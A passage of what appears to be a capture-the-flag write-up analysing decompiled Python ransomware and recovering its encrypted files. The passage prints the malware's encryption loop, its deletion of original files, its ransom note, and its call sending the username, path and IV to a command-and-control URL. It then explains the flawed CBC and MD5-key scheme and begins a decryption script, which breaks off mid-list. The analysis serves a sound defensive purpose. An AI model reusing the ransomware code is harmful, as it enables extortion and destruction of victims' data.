+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71</span>    os.unlink(path)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74</span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">lock_files</span>():
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75</span>    username = get_username()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76</span>    <span style="color:#658b00">print</span>(username)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77</span>    <span style="color:#8b008b;font-weight:bold">if</span> username <span style="color:#8b008b">in</span> TARGETS:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78</span>        <span style="color:#8b008b;font-weight:bold">for</span> directory, _, filenames <span style="color:#8b008b">in</span> os.walk(TARGET_DIR):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79</span>            <span style="color:#8b008b;font-weight:bold">for</span> filename <span style="color:#8b008b">in</span> filenames:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80</span>                <span style="color:#8b008b;font-weight:bold">if</span> filename.endswith(<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">.hacked</span><span style="color:#cd5555">&#39;</span>):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81</span>                    <span style="color:#8b008b;font-weight:bold">continue</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82</span>                fullpath = os.path.join(directory, filename)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83</span>                <span style="color:#658b00">print</span>(<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Encrypting</span><span style="color:#cd5555">&#39;</span>, fullpath)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84</span>                lock_file(fullpath)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86</span>        <span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(os.path.join(TARGET_DIR, <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">READ_THIS.txt</span><span style="color:#cd5555">&#39;</span>), <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">wb</span><span style="color:#cd5555">&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> (fo):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87</span>            fo.write(<span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">We have hacked all your files. Buy 1 BTC and contact us</span><span style="color:#cd5555">\
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">88</span><span style="color:#cd5555"></span><span style="color:#cd5555">					   at hacked@virus.com</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#39;</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">89</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">90</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">91</span><span style="color:#8b008b;font-weight:bold">if</span> __name__ == <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">__main__</span><span style="color:#cd5555">&#39;</span>:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">92</span>    lock_files()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">93</span><span style="color:#228b22"># okay decompiling virus.cpython-37.pyc</span></code></pre></div>
+<h1 id="understanding-the-virus">Understanding the virus</h1>
+<h2 id="what-is-the-ransomware-doing">What is the ransomware doing?</h2>
+<p>It first checks if the current user is a target. If it's the case, it goes through all the subdirectories of the <code>TARGET_DIR</code> directory and locks/encrypts all the files that do not have the &lsquo;.hacked&rsquo; extension. After encryption, the original file is removed with the <code>os.unlink</code> function.</p>
+<h2 id="how-does-the-virus-encrypt-the-files">How does the virus encrypt the files?</h2>
+<p>The virus uses <a href="https://www.wikiwand.com/en/Advanced_Encryption_Standard">Advanced Encryption Standard (AES)</a> to encrypt the files. The mode is set to <a href="https://www.wikiwand.com/en/Block_cipher_mode_of_operation#/Electronic_Codebook_(ECB)">Electronic Codebook (ECB)</a> (<code>AES.new(key, 1)</code>, in line 55, 1 being the ECB mode) but the implementation is actually <a href="https://www.wikiwand.com/en/Block_cipher_mode_of_operation#/Cipher_Block_Chaining_(CBC)">Cipher Block Chaining (CBC)</a>:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50</span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">lock_file</span>(path):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51</span>    username = get_username()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52</span>    hsh = hashlib.new(<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">md5</span><span style="color:#cd5555">&#39;</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53</span>    hsh.update(username)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54</span>    key = hsh.digest()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55</span>    cip = AES.new(key, <span style="color:#b452cd">1</span>)
+<span style="display:block;width:100%;background-color:#d6d6c6"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56</span>    iv = get_random_bytes(<span style="color:#b452cd">16</span>)
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57</span>    params = ((<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">target</span><span style="color:#cd5555">&#39;</span>, username), (<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">path</span><span style="color:#cd5555">&#39;</span>, path), (<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">iv</span><span style="color:#cd5555">&#39;</span>, iv))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58</span>    requests.get(C2_URL, params=params)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59</span>    <span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(path, <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">rb</span><span style="color:#cd5555">&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> (fi):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60</span>        <span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(path + <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">.hacked</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">wb</span><span style="color:#cd5555">&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> (fo):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61</span>            block = fi.read(<span style="color:#b452cd">16</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62</span>            <span style="color:#8b008b;font-weight:bold">while</span> block:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63</span>                <span style="color:#8b008b;font-weight:bold">while</span> <span style="color:#658b00">len</span>(block) &lt; <span style="color:#b452cd">16</span>:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64</span>                    block += <span style="color:#658b00">bytes</span>([<span style="color:#b452cd">0</span>])
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66</span>                cipherblock = cip.encrypt(xorbytes(block, iv))
+<span style="display:block;width:100%;background-color:#d6d6c6"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67</span>                iv = cipherblock
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68</span>                fo.write(cipherblock)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69</span>                block = fi.read(<span style="color:#b452cd">16</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71</span>    os.unlink(path)
+</code></pre></div><p>As you can see in the highlighted areas, an initialization vector (IV) is first generated in order to make the first cipherblock. After that, the IV is equal to the subsequent cipherblocks.</p>
+<p>The key used for the AES encryption is the md5 hash of the username, which is always 128 bits long.</p>
+<h1 id="how-could-we-decrypt-the-files">How could we decrypt the files?</h1>
+<h2 id="information-we-have">Information we have</h2>
+<ul>
+<li>the first plaintext block $p_1$, because we know the extension of the encrypted files and therefore its magic bytes
+<ul>
+<li>for a JPEG file: $p_1=$ <code>0xffd8ffe000104a464946000101010048</code></li>
+</ul>
+</li>
+<li>the key: must be in the list of the md5 hashes from the <code>TARGETS</code> array</li>
+<li>all cipherblocks $c_n$</li>
+</ul>
+<p>The only thing we do not know is the random initial vector.</p>
+<p>However, as the formula for decrypting CBC is:</p>
+<p>$$
+p_i = D_K(c_i) \oplus c_{i-1}
+$$</p>
+<p>with $c_0 = IV$, we know $p_n$ for all $n \geq 2$, because every cipherblock is decrypted using the previous cipherblock. For example:</p>
+<p>$$
+p_3 = D_K(c_3) \oplus c_2
+$$</p>
+<p>Using the magic bytes, we therefore know all the plaintext blocks.</p>
+<h2 id="strategy">Strategy</h2>
+<ul>
+<li>decode every file with each possible key</li>
+<li>replace the first plain text block with the magic bytes of a jpeg image</li>
+<li>make a HTML page to quickly filter the good images</li>
+</ul>
+<p><strong>Note</strong>: Another possible strategy to know which is the correct key would have been using the end-of-file marker (<code>%%EOF</code>). If the last plaintext block has this marker, we have the key.</p>
+<h2 id="solution">Solution</h2>
+<p>The first script decrypts the files, creating a folder for each target:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#228b22">#!/usr/bin/python3</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#8b008b;font-weight:bold">from</span> <span style="color:#008b45;text-decoration:underline">Crypto</span><span style="color:#008b45;text-decoration:underline">.</span><span style="color:#008b45;text-decoration:underline">Cipher</span> <span style="color:#8b008b;font-weight:bold">import</span> AES
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#8b008b;font-weight:bold">from</span> <span style="color:#008b45;text-decoration:underline">Crypto</span><span style="color:#008b45;text-decoration:underline">.</span><span style="color:#008b45;text-decoration:underline">Random</span> <span style="color:#8b008b;font-weight:bold">import</span> get_random_bytes
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">Crypto</span><span style="color:#008b45;text-decoration:underline">.</span><span style="color:#008b45;text-decoration:underline">Util</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">hashlib</span>, <span style="color:#008b45;text-decoration:underline">os</span>, <span style="color:#008b45;text-decoration:underline">getpass</span>, <span style="color:#008b45;text-decoration:underline">requests</span>, <span style="color:#008b45;text-decoration:underline">binascii</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>TARGETS = [<span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Scott Farquhar</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Lei Jun</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Reid Hoffman</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Zhou Qunfei</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jeff Bezos</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Shiv Nadar</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Simon Xie</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Ma Huateng</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Ralph Dommermuth</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Barry Lam</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Nathan Blecharczyk</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Judy Faulkner</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">William Ding</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Scott Cook</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Gordon Moore</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Marc Benioff</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Michael Dell</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Yusaku Maezawa</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Yuri Milner</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Bobby Murphy</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Larry Page</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Henry Samueli</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jack Ma</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jen-Hsun Huang</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jay Y. Lee</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Joseph Tsai</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Dietmar Hopp</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Henry Nicholas, III.</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Dustin Moskovitz</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Mike Cannon-Brookes</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Robert Miller</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Bill Gates</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Garrett Camp</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Lin Xiucheng</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Gil Shwed</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Sergey Brin</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Rishi Shah</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Denise Coates</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Zhang Fan</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Michael Moritz</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Robin Li</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Andreas von Bechtolsheim</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Brian Acton</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Sean Parker</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">John Doerr</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">David Cheriton</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Brian Chesky</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Wang Laisheng</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jan Koum</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jack Sheerack</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Terry Gou</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Adam Neumann</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">James Goodnight</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Larry Ellison</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Wang Laichun</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Masayoshi Son</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Min Kao</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Hiroshi Mikitani</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Lee Kun-Hee</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">David Sun</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Mark Scheinberg</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Yeung Kin-man</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">John Tu</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Teddy Sagi</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Frank Wang</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Robert Pera</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Eric Schmidt</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Wang Xing</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Evan Spiegel</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Travis Kalanick</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Steve Ballmer</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Mark Zuckerberg</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jason Chang</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Lam Wai Ying</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Romesh T. Wadhwani</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Liu Qiangdong</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jim Breyer</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Zhang Zhidong</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Pierre Omidyar</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Elon Musk</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">David Filo</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Joe Gebbia</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jiang Bin</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Pan Zhengmin</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Douglas Leone</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Hasso Plattner</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Paul Allen</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Meg Whitman</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Azim Premji</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Fu Liquan</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jeff Rothschild</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">John Sall</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Kim Jung-Ju</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">David Duffield</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Gabe Newell</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Scott Lin</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Eduardo Saverin</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jeffrey Skoll</span><span style="color:#cd5555">&#39;</span>,
